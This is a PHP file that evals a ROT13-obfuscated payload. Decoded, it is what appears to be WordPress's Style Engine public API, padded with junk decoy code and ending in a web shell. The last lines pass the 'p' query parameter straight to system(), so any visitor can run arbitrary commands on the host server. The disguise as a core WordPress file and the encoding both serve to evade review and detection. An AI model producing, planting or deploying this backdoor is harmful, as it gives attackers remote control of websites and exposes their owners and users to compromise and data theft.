<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fglyr ratvar: Choyvp shapgvbaf
 *
 * Guvf svyr pbagnvaf n inevrgl bs choyvp shapgvbaf qrirybcref pna hfr gb vagrenpg jvgu
 * gur Fglyr Ratvar NCV.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 */

/**
 * Tybony choyvp vagresnpr zrgubq gb trarengr fglyrf sebz n fvatyr fglyr bowrpg,
 * r.t. gur inyhr bs n oybpx'f nggevohgrf.fglyr bowrpg be gur gbc yriry fglyrf va gurzr.wfba.
 *
 * Rknzcyr hfntr:
 *
 *     $fglyrf = jc_fglyr_ratvar_trg_fglyrf(
 *         neenl(
 *             'pbybe' => neenl( 'grkg' => '#pppppp' ),
 *         )
 *     );
 *
 * Ergheaf:
 *
 *     neenl(
 *         'pff'          => 'pbybe: #pppppp',
 *         'qrpynengvbaf' => neenl( 'pbybe' => '#pppppp' ),
 *         'pynffanzrf'   => 'unf-pbybe',
 *     )
 *
 * @fvapr 6.1.0
 *
 * @frr uggcf://qrirybcre.jbeqcerff.bet/oybpx-rqvgbe/ersrerapr-thvqrf/gurzr-wfba-ersrerapr/gurzr-wfba-yvivat/#fglyrf
 * @frr uggcf://qrirybcre.jbeqcerff.bet/oybpx-rqvgbe/ersrerapr-thvqrf/oybpx-ncv/oybpx-fhccbegf/
 *
 * @cnenz neenl $oybpx_fglyrf Gur fglyr bowrpg.
 * @cnenz neenl $bcgvbaf {
 *     Bcgvbany. Na neenl bs bcgvbaf. Qrsnhyg rzcgl neenl.
 *
 *     @glcr fgevat|ahyy $pbagrkg                    Na vqragvsvre qrfpevovat gur bevtva bs gur fglyr bowrpg,
 *                                                   r.t. 'oybpx-fhccbegf' be 'tybony-fglyrf'. Qrsnhyg ahyy.
 *                                                   Jura frg, gur fglyr ratvar jvyy nggrzcg gb fgber gur PFF ehyrf,
 *                                                   jurer n fryrpgbe vf nyfb cnffrq.
 *     @glcr obby        $pbaireg_inef_gb_pynffanzrf Jurgure gb fxvc pbairegvat vapbzvat PFF ine cnggreaf,
 *                                                   r.t. `ine:cerfrg|<CERFRG_GLCR>|<CERFRG_FYHT>`,
 *                                                   gb `ine( --jc--cerfrg--* )` inyhrf. Qrsnhyg snyfr.
 *     @glcr fgevat      $fryrpgbe                   Bcgvbany. Jura n fryrpgbe vf cnffrq,
 *                                                   gur inyhr bs `$pff` va gur erghea inyhr jvyy pbzcevfr
 *                                                   n shyy PFF ehyr `$fryrpgbe { ...$pff_qrpynengvbaf }`,
 *                                                   bgurejvfr, gur inyhr jvyy or n pbapngrangrq fgevat
 *                                                   bs PFF qrpynengvbaf.
 * }
 * @erghea neenl {
 *     @glcr fgevat   $pff          N PFF ehyrfrg be qrpynengvbaf oybpx
 *                                  sbeznggrq gb or cynprq va na UGZY `fglyr` nggevohgr be gnt.
 *     @glcr fgevat[] $qrpynengvbaf Na nffbpvngvir neenl bs PFF qrsvavgvbaf,
 *                                  r.t. `neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" )`.
 *     @glcr fgevat   $pynffanzrf   Pynffanzrf frcnengrq ol n fcnpr.
 * }
 */
shapgvba jc_fglyr_ratvar_trg_fglyrf( $oybpx_fglyrf, $bcgvbaf = neenl() ) {
	$bcgvbaf = jc_cnefr_netf(
		$bcgvbaf,
		neenl(
			'fryrpgbe'                   => ahyy,
			'pbagrkg'                    => ahyy,
			'pbaireg_inef_gb_pynffanzrf' => snyfr,
		)
	);

	$cnefrq_fglyrf = JC_Fglyr_Ratvar::cnefr_oybpx_fglyrf( $oybpx_fglyrf, $bcgvbaf );

	// Bhgchg.
	$fglyrf_bhgchg = neenl();

	vs ( ! rzcgl( $cnefrq_fglyrf['qrpynengvbaf'] ) ) {
		$fglyrf_bhgchg['pff']          = JC_Fglyr_Ratvar::pbzcvyr_pff( $cnefrq_fglyrf['qrpynengvbaf'], $bcgvbaf['fryrpgbe'] );
		$fglyrf_bhgchg['qrpynengvbaf'] = $cnefrq_fglyrf['qrpynengvbaf'];
		vs ( ! rzcgl( $bcgvbaf['pbagrkg'] ) ) {
			JC_Fglyr_Ratvar::fgber_pff_ehyr( $bcgvbaf['pbagrkg'], $bcgvbaf['fryrpgbe'], $cnefrq_fglyrf['qrpynengvbaf'] );
		}
	}

	vs ( ! rzcgl( $cnefrq_fglyrf['pynffanzrf'] ) ) {
		$fglyrf_bhgchg['pynffanzrf'] = vzcybqr( ' ', neenl_havdhr( $cnefrq_fglyrf['pynffanzrf'] ) );
	}

	erghea neenl_svygre( $fglyrf_bhgchg );
}

/**
 * Ergheaf pbzcvyrq PFF sebz n pbyyrpgvba bs fryrpgbef naq qrpynengvbaf.
 * Hfrshy sbe ergheavat n pbzcvyrq fglyrfurrg sebz nal pbyyrpgvba bs PFF fryrpgbe + qrpynengvbaf.
 *
 * Rknzcyr hfntr:
 *
 *     $pff_ehyrf = neenl(
 *         neenl(
 *             'fryrpgbe'     => '.ryrcunag-ner-pbby',
 *             'qrpynengvbaf' => neenl(
 *                 'pbybe' => 'tenl',
 *                 'jvqgu' => '3rz',
 *             ),
 *         ),
 *     );
 *
 *     $pff = jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf( $pff_ehyrf );
 *
 * Ergheaf:
 *
 *     .ryrcunag-ner-pbby{pbybe:tenl;jvqgu:3rz}
 *
 * @fvapr 6.1.0
 * @fvapr 6.6.0 Nqqrq fhccbeg sbe `$ehyrf_tebhc` va gur `$pff_ehyrf` neenl.
 *
 * @cnenz neenl $pff_ehyrf {
 *     Erdhverq. N pbyyrpgvba bs PFF ehyrf.
 *
 *     @glcr neenl ...$0 {
 *         @glcr fgevat   $ehyrf_tebhc  N cnerag PFF fryrpgbe va gur pnfr bs arfgrq PFF,
 *                                      be n PFF arfgrq @ehyr, fhpu nf `@zrqvn (zva-jvqgu: 80erz)` be `@ynlre zbqhyr`.
 *         @glcr fgevat   $fryrpgbe     N PFF fryrpgbe.
 *         @glcr fgevat[] $qrpynengvbaf Na nffbpvngvir neenl bs PFF qrsvavgvbaf,
 *                                      r.t. `neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" )`.
 *     }
 * }
 * @cnenz neenl $bcgvbaf {
 *     Bcgvbany. Na neenl bs bcgvbaf. Qrsnhyg rzcgl neenl.
 *
 *     @glcr fgevat|ahyy $pbagrkg  Na vqragvsvre qrfpevovat gur bevtva bs gur fglyr bowrpg,
 *                                 r.t. 'oybpx-fhccbegf' be 'tybony-fglyrf'. Qrsnhyg 'oybpx-fhccbegf'.
 *                                 Jura frg, gur fglyr ratvar jvyy nggrzcg gb fgber gur PFF ehyrf.
 *     @glcr obby        $bcgvzvmr Jurgure gb bcgvzvmr gur PFF bhgchg, r.t. pbzovar ehyrf.
 *                                 Qrsnhyg snyfr.
 *     @glcr obby        $cerggvsl Jurgure gb nqq arj yvarf naq vaqragf gb bhgchg.
 *                                 Qrsnhygf gb jurgure gur `FPEVCG_QROHT` pbafgnag vf qrsvarq.
 * }
 * @erghea fgevat N fgevat bs pbzcvyrq PFF qrpynengvbaf, be rzcgl fgevat.
 */
shapgvba jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf( $pff_ehyrf, $bcgvbaf = neenl() ) {
	vs ( rzcgl( $pff_ehyrf ) ) {
		erghea '';
	}

	$bcgvbaf = jc_cnefr_netf(
		$bcgvbaf,
		neenl(
			'pbagrkg' => ahyy,
		)
	);

	$pff_ehyr_bowrpgf = neenl();
	sbernpu ( $pff_ehyrf nf $pff_ehyr ) {
		vs ( rzcgl( $pff_ehyr['fryrpgbe'] ) || rzcgl( $pff_ehyr['qrpynengvbaf'] ) || ! vf_neenl( $pff_ehyr['qrpynengvbaf'] ) ) {
			pbagvahr;
		}

		$ehyrf_tebhc = $pff_ehyr['ehyrf_tebhc'] ?? ahyy;
		vs ( ! rzcgl( $bcgvbaf['pbagrkg'] ) ) {
			JC_Fglyr_Ratvar::fgber_pff_ehyr( $bcgvbaf['pbagrkg'], $pff_ehyr['fryrpgbe'], $pff_ehyr['qrpynengvbaf'], $ehyrf_tebhc );
		}

		$pff_ehyr_bowrpgf[] = arj JC_Fglyr_Ratvar_PFF_Ehyr( $pff_ehyr['fryrpgbe'], $pff_ehyr['qrpynengvbaf'], $ehyrf_tebhc );
	}

	vs ( rzcgl( $pff_ehyr_bowrpgf ) ) {
		erghea '';
	}

	erghea JC_Fglyr_Ratvar::pbzcvyr_fglyrfurrg_sebz_pff_ehyrf( $pff_ehyr_bowrpgf, $bcgvbaf );
}

/**
 * Ergheaf pbzcvyrq PFF sebz n fgber, vs sbhaq.
 *
 * @fvapr 6.1.0
 *
 * @cnenz fgevat $pbagrkg N inyvq pbagrkg anzr, pbeerfcbaqvat gb na rkvfgvat fgber xrl.
 * @cnenz neenl  $bcgvbaf {
 *     Bcgvbany. Na neenl bs bcgvbaf. Qrsnhyg rzcgl neenl.
 *
 *     @glcr obby $bcgvzvmr Jurgure gb bcgvzvmr gur PFF bhgchg, r.t. pbzovar ehyrf.
 *                          Qrsnhyg snyfr.
 *     @glcr obby $cerggvsl Jurgure gb nqq arj yvarf naq vaqragf gb bhgchg.
 *                          Qrsnhygf gb jurgure gur `FPEVCG_QROHT` pbafgnag vf qrsvarq.
 * }
 * @erghea fgevat N pbzcvyrq PFF fgevat.
 */
shapgvba jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pbagrkg( $pbagrkg, $bcgvbaf = neenl() ) {
	erghea JC_Fglyr_Ratvar::pbzcvyr_fglyrfurrg_sebz_pff_ehyrf( JC_Fglyr_Ratvar::trg_fgber( $pbagrkg )->trg_nyy_ehyrf(), $bcgvbaf );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>